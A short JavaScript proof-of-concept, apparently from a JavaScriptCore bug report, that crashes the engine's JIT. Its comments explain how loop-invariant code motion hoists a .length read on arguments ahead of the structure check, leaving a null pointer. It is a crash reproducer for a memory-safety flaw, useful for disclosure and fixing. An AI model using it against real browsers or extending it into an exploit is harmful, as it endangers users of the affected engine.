function v2(trigger) {
    // Force JIT compilation.
    for (let v7 = 0; v7 < 1000000; v7++) { }

    if (!trigger) {
        // Will synthesize .length, .callee, and Symbol.iterator.
        // See ScopedArguments::overrideThings [1]
        arguments.length = 1;
    }

    for (let v11 = 0; v11 < 10; v11++) {
        // The for-of loop (really the inlined array iterator) will fetch the
        // .length property after a StructureCheck. However, the property fetch
        // will be hoisted in front of the outer loop by LICM but the
        // StructureCheck won't. Then, in the final invocation it will crash
        // because .length hasn't been synthezised yet (and thus the butterfly
        // is nullptr).
        for (const v14 of arguments) {
            const v18 = {a:1337};
            // The with statement here probably prevents escape analysis /
            // object allocation elimination from moving v18 into the stack,
            // thus forcing DFG to actually allocate v18. Then, LICM sees a
            // write to structure IDs (from the object allocation) and thus
            // cannot hoist the structure check (reading a structure ID) in
            // front of the loop.
            with (v18) { }
        }
    }
}

for (let v23 = 0; v23 < 100; v23++) {
    v2(false);
}

print("Triggering crash");
v2(true);